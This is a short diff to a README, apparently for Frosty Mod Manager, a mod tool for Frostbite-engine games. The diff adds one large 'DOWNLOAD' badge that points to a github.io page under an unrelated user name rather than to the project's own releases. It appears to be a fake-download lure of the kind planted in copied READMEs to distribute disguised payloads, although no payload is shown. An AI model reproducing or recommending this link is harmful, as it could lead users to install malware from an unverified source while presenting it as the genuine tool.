@@ -30,6 +30,12 @@ Frosty Mod Manager installs, manages, and launches mods for Frostbite-powered ga
 
 Whether you're a newcomer or a veteran, Frosty Mod Manager provides the tools you need to get the most out of your gaming mods experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download Frosty Mod Manager](https://img.shields.io/badge/⬇_DOWNLOAD_Frosty+Mod+Manager-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
